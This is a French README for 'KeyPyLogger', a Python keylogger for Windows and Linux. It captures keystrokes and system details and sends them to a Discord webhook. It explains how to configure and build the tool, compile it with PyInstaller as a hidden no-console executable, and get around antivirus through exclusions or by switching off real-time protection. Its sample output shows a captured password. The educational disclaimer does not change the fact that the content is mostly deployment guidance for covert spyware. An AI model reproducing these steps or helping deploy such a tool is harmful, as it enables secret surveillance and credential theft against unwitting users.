# 🔑 KeyPyLogger

Un keylogger éducatif multi-plateforme (Windows/Linux) qui envoie les frappes clavier capturées vers un webhook Discord.

## ⚠️ AVERTISSEMENT LÉGAL

**IMPORTANT : CET OUTIL EST DESTINÉ UNIQUEMENT À DES FINS ÉDUCATIVES ET DE TESTS AUTORISÉS**

- ✅ Utilisation autorisée : Recherche en cybersécurité, CTF, tests de pénétration autorisés, apprentissage
- ❌ Utilisation interdite : Surveillance non autorisée, espionnage, violation de la vie privée

**L'utilisation de keyloggers sans consentement explicite est ILLÉGALE dans la plupart des juridictions.**

L'auteur n'est pas responsable des utilisations abusives de cet outil. Utilisez-le uniquement sur des systèmes que vous possédez ou pour lesquels vous avez une autorisation écrite explicite.

## 🎯 Fonctionnalités

- ✅ **Multi-plateforme** : Fonctionne sur Windows et Linux
- ✅ **Discord Integration** : Envoie les logs via webhook Discord
- ✅ **Configuration facile** : Builder interactif pour configuration plug-and-play
- ✅ **Envoi périodique** : Les logs sont envoyés à intervalles configurables
- ✅ **Informations système** : Collecte des informations de base du système
- ✅ **Gestion des touches spéciales** : Détecte Enter, Backspace, touches de fonction, etc.
- ✅ **Build exécutable** : Possibilité de créer un exécutable standalone

## 📋 Prérequis

### Python
- Python 3.7 ou supérieur
- pip (gestionnaire de paquets Python)

### Système
- **Linux** : Peut nécessiter des permissions supplémentaires pour la capture clavier
- **Windows** : Fonctionne sans privilèges particuliers (sauf pour certaines applications protégées)

## 🚀 Installation

### 1. Cloner le repository

```bash
git clone https://github.com/votre-username/KeyPyLogger.git
cd KeyPyLogger
```

### 2. Installer les dépendances

```bash
pip install -r requirements.txt
```

## 🔧 Configuration et Utilisation

### Méthode 1 : Builder Interactif (Recommandé)

```bash
python builder.py
```

Le builder vous guidera à travers :
1. Configuration du webhook Discord
2. Intervalle d'envoi des logs
3. Choix du type de build (script Python ou exécutable)

### Méthode 2 : Builder en ligne de commande

```bash
python builder.py "https://discord.com/api/webhooks/YOUR_WEBHOOK" 60 keylogger_output.py
```

Arguments :
- `webhook_url` : URL du webhook Discord (requis)
- `interval` : Intervalle d'envoi en secondes (défaut: 60)
- `output_name` : Nom du fichier de sortie (défaut: keylogger_configured.py)

### 3. Exécuter le keylogger configuré

```bash
# Script Python
python build/keylogger_configured.py

# Ou exécutable (si compilé)
./build/dist/keylogger  # Linux
build\dist\keylogger.exe  # Windows
```

## 🎨 Créer un Webhook Discord

1. Ouvrir Discord et aller sur le serveur souhaité
2. Paramètres du serveur → Intégrations → Webhooks
3. Cliquer sur "Nouveau Webhook"
4. Personnaliser le nom et le canal
5. Copier l'URL du webhook
6. Utiliser cette URL avec le builder

## 📦 Structure du Projet

```
KeyPyLogger/
├── keylogger.py          # Code source principal du keylogger
├── builder.py            # Outil de configuration et compilation
├── requirements.txt      # Dépendances Python
├── README.md            # Documentation
├── LICENSE              # Licence
└── build/               # Répertoire de sortie (créé après build)
    ├── keylogger_configured.py
    └── dist/
        └── keylogger[.exe]
```

## 🔍 Fonctionnement Technique

### Capture des frappes
Le keylogger utilise la bibliothèque `pynput` pour capturer les événements clavier de manière cross-platform.

### Envoi des données
- Les frappes sont stockées dans un buffer en mémoire
- Envoi automatique toutes les X secondes (configurable)
- Envoi forcé si le buffer dépasse 1000 caractères
- Format Discord Embed pour une présentation claire

### Informations collectées
- Frappes clavier (caractères et touches spéciales)
- Nom d'hôte du système
- Système d'exploitation et version
- Architecture du processeur
- Timestamp de chaque log

## 🛡️ Détection et Sécurité

### Détection par Antivirus

**Note importante** : Ce keylogger utilise des techniques standards et peut être détecté par certains antivirus. Pour un projet éducatif légitime :

1. **Ajoutez des exclusions** dans votre antivirus pour le dossier du projet
2. **Désactivez temporairement** la protection en temps réel pendant les tests
3. **Utilisez une VM** pour les tests en environnement isolé

### Bonnes pratiques de sécurité

Pour vos tests éducatifs :
- Utilisez toujours une machine virtuelle dédiée
- Ne testez jamais sur des systèmes de production
- Gardez le webhook Discord privé
- Supprimez les logs après les tests
- Documentez vos autorisations de test

## 🐧 Spécificités Linux

### Permissions
Sur Linux, vous pourriez avoir besoin de permissions supplémentaires :

```bash
# Ajouter l'utilisateur au groupe input
sudo usermod -a -G input $USER

# Ou exécuter avec sudo (non recommandé pour la production)
sudo python keylogger_configured.py
```

### Environnement graphique
Nécessite un environnement X11 ou Wayland actif.

## 🪟 Spécificités Windows

### Exécution silencieuse
Pour compiler en mode sans console (plus discret pour tests) :

```bash
pyinstaller --onefile --noconsole keylogger_configured.py
```

### Applications protégées
Certaines applications (programmes administrateurs, UAC) peuvent bloquer la capture clavier.

## 🧪 Tests et Validation

### Test de base

```bash
# 1. Construire le keylogger
python builder.py

# 2. Exécuter dans un terminal
python build/keylogger_configured.py

# 3. Taper quelques caractères
# 4. Vérifier le webhook Discord après l'intervalle configuré
```

### Test de l'exécutable

```bash
# Compiler
python builder.py  # Choisir option 2

# Exécuter
./build/dist/keylogger
```

## 📝 Exemple de Sortie Discord

```
🔑 Keylog Report - DESKTOP-ABC123

```
Hello World[ENTER]
Test 123[BACKSPACE][BACKSPACE][BACKSPACE]
password123[ENTER]
```

System: Windows 10 x86_64
Timestamp: 2025-11-15 14:30:45
Buffer Size: 156 characters
```

## 🔧 Dépannage

### "ModuleNotFoundError: No module named 'pynput'"
```bash
pip install -r requirements.txt
```

### "Permission denied" sur Linux
```bash
sudo usermod -a -G input $USER
# Puis déconnexion/reconnexion
```

### Le webhook ne fonctionne pas
- Vérifier que l'URL du webhook est correcte
- Vérifier la connexion Internet
- Vérifier que le webhook n'a pas été supprimé sur Discord

### L'antivirus supprime l'exécutable
- Ajouter une exclusion pour le dossier KeyPyLogger
- Utiliser un certificat de signature de code (pour production légitime)
- Tester dans une VM isolée

## 🎓 Contexte Éducatif

Ce projet est conçu pour :
- Comprendre le fonctionnement des keyloggers
- Apprendre les techniques de défense contre les keyloggers
- Pratiquer la programmation Python multi-plateforme
- Étudier l'interaction avec les API (Discord webhooks)
- Développer des compétences en cybersécurité défensive

## 📚 Ressources Complémentaires

- [pynput Documentation](https://pynput.readthedocs.io/)
- [Discord Webhook Guide](https://discord.com/developers/docs/resources/webhook)
- [PyInstaller Documentation](https://pyinstaller.org/)

## 🤝 Contribution

Les contributions sont les bienvenues pour améliorer cet outil éducatif :
- Rapports de bugs
- Suggestions de fonctionnalités
- Améliorations de la documentation
- Corrections de code

## 📄 Licence

MIT License - Voir le fichier LICENSE pour plus de détails.

## ⚖️ Responsabilité

En utilisant cet outil, vous acceptez :
- De l'utiliser uniquement à des fins éducatives et légales
- D'obtenir un consentement explicite avant tout test
- De ne pas porter atteinte à la vie privée d'autrui
- D'assumer l'entière responsabilité de votre utilisation

**L'auteur décline toute responsabilité en cas d'utilisation abusive ou illégale de cet outil.**

---

**🎓 Projet éducatif - Utilisez de manière responsable**
